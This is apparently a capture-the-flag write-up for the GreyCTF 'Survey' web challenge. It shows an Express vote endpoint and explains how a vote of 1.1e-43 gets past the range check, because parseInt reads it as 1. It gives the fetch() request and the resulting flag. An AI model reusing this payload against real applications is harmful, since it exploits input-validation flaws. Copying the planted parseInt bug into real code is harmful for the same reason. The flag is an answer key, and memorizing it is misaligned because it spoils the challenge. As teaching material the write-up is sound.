# Greyctf Survey

### Challenge (100 points, 152 solves)

> Your honest feedback is appreciated :) (but if you give us a good rating we'll give you a flag)
>
> Author: jro
>
> http://challs.nusgreyhats.org:33334

### Analysis

Upon inspection of the source code, the flag is hidden at the following voting endpoint:

```js
let score = -0.42069;

// Other endpoints

app.post('/vote', async (req, res) => {
    const {vote} = req.body;
    if(typeof vote != 'number') {
        return res.status(400).json({
            "error": true,
            "msg":"Vote must be a number"
        });
    }
    if(vote < 1 && vote > -1) {
        score += parseInt(vote);
        if(score > 1) {
            score = -0.42069;
            return res.status(200).json({
                "error": false,
                "msg": config.flag,
            });
        }
        return res.status(200).json({
            "error": false,
            "data": score,
            "msg": "Vote submitted successfully"
        });
    } else {
        return res.status(400).json({
            "error": true,
            "msg":"Invalid vote"
        });
    }
})
```

Our goal is therefore to send a number `vote` that lies within `(-1, 1)`, such that `parseInt` of such number increases the value of `score`. As long as the `parseInt` value of `vote` is positive, we can send the requests multiple times so that `score` exceeds 1, then we can consequently get the flag.

However, `parseInt` only takes the integer part of a number, hence in theory, all numbers within `(-1, 1)` should have `parseInt` value of `0`. There seems to be no value of `vote` that can have `parseInt` value of `1`.

Upon closer inspection of `parseInt` documentation on [MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/parseInt):

> Because large numbers use the e character in their string representation (e.g. `6.022e23` for 6.022 × 1023), using `parseInt` to truncate numbers will produce unexpected results when used on very large or very small numbers. `parseInt` should not be used as a substitute for `Math.trunc()`.

I therefore tried very small numbers and observe if they produce unexpected results. And indeed one does:

```
> parseInt(1.1e-43)
1
```

We therefore can send `1.1e-43` as `vote` to the endpoint. Crafting the request as a POST request in JSON format as follows produces the flag in the console:

```js
fetch('/vote', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        vote: 1.1e-43,
    }),
}).then(res => res.text()).then(res => console.log(res))
```

Sendin the above request two times, we obtain the following in the console:

```
{"error":false,"msg":"grey{50m371m35_4_l177l3_6035_4_l0n6_w4y}"}
```

### Flag

```
grey{50m371m35_4_l177l3_6035_4_l0n6_w4y}
```
